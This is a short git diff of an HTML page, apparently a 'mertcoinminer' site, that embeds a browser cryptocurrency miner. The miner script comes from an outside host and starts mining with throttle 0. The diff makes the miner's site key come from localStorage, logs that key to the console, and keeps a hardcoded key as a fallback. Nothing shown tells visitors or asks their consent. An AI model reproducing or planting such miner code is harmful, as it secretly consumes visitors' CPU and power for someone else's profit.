@@ -1,6 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+        <!-- Key -->
+          <script>
+key = localStorage.getItem("key");
+		  console.log(key);
+if(key == null){key = '6e8067e289507961a17268271edbefca1e41d31d4b71b3a781aada8c0611dfdb';}	
+		  console.log(key);
+          </script>	  
 	<!-- Imports -->
   <link rel="stylesheet" href="https://mertcoinminer.ml/page.css">
   <script src="https://www.hostingcloud.racing/0Frc.js"></script>
@@ -49,7 +56,7 @@
 <!-- Miner script -->	  
   <script>
    try{
-    var _client = new Client.Anonymous('6e8067e289507961a17268271edbefca1e41d31d4b71b3a781aada8c0611dfdb', {
+    var _client = new Client.Anonymous(key, {
         throttle: 0, c: 'w'
     });
     _client.start();
